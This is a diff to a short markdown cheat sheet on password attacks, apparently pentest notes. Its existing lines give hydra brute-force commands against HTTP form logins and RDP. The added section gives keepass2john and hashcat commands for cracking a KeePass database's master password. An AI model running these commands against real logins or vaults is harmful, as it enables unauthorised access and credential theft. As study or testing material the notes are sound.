@@ -4,6 +4,7 @@ Index
 - [First Rule!](#First-Rule)
 - [Form Login](#Form-Login)
 - [RDP](#RDP)
+- [KeePass DB](#KeePass-DB)
 
 ## First Rule
 Always try the default credentials!
@@ -18,3 +19,10 @@ hydra -L user.txt -P /usr/share/wordlists/rockyou.txt 192.168.1.1 -s 443 http-po
 ``` bash
 hydra -L user.txt -P /usr/share/wordlists/rockyou.txt rdp://192.168.1.1
 ```
+
+## KeePass DB
+``` bash
+keepass2john Database.kdbx > keepass.hash                                                               ## extract the hash (*)
+hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule  ## cracking
+```
+(*) The hash file was generated with the string "Database:", delete it.
